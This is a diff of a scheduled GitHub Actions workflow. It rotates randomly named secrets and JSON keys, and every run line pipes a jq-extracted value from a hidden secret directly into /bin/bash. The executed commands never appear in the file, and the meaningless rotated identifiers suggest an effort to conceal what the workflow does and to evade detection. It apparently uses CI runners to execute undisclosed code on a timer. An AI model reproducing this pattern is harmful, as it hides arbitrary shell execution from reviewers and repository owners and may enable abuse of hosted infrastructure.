@@ -3,20 +3,24 @@ name: zhoubozou
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 2/6 * * *'
-
-jobs:  # 16708
+    - cron: '1 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhoubozou
         env:
-          exep4225: ${{ secrets.exep4225 }}
+          heulb9: ${{ secrets.heulb9 }}
         run: |
-          echo $exep4225 | jq -r .nd3 | /bin/bash
-          echo $vtlz9779 | jq -r .h4657 | /bin/bash
-          echo $je0144 | jq -r .gmb27 | /bin/bash
-          echo $gvepg5 | jq -r .c696 | /bin/bash
-          echo $rtkd642 | jq -r .sv85 | /bin/bash
+          echo $heulb9 | jq -r .wir589 | /bin/bash
+          echo $nlo08437 | jq -r .vmpcq95 | /bin/bash
+          echo $ko25384 | jq -r .i4 | /bin/bash
+          echo $t469 | jq -r .j31 | /bin/bash
+          echo $x799 | jq -r .rufnf0 | /bin/bash
+          echo $jfvh33122 | jq -r .up7052 | /bin/bash
+          echo $oj61 | jq -r .fik6337 | /bin/bash
+          echo $ekhh0 | jq -r .syyvg245 | /bin/bash
+          echo $z076 | jq -r .l72411 | /bin/bash
 
